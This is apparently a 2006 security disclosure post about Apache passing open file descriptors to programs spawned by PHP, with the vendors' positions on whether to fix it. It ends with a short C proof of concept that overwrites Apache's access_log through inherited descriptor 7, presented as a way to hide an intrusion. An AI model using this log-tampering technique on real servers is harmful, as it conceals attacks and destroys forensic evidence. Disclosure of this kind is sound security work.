Hello,

This is not a new problem (see http://www.securityfocus.com/bid/9302).
However, we also "discovered" this a few weeks ago and contacted Apache
and PHP about it. According to Stefan Esser (PHP) its due to Apache's
failure to open file descriptors with the close on exec flag. However,
according to Joe Orton (Apache) won't change this flag because it would
make no difference to Apache's security model ("anything you can do in a
sh script spawned by a PHP script you can do directly in the PHP script
anyway"). The bottom line is that this will also work in future, because
neither the Apache team nor the PHP team will "fix" the issue.
Personally, I'd think that a combination of both measures (close on exec
flag and explicitly closing specific file descriptors by PHP) would make
the most sense.
BTW, with this flaw an attacker can also conveniently change / overwrite
Apache's log files and therefore hide his attack after owning a
PHP-based web application. Here's a quick POC as I haven't seen one
anywhere yet :)


------------

# apache's access_log can be overwritten with arbitrary content
# from PHP called executables.
# POC by frauk\x41ser && sk0L / SEC Consult 2006

#include <unistd.h>
#include <fcntl.h>

#define LOGFD 7

void main(){
	fcntl(LOGFD, F_SETFL, O_WRONLY); // change mode from append to write
	lseek(LOGFD, 0, SEEK_SET); // reposition to start of file
	write(LOGFD,"hehe\n",5);
}
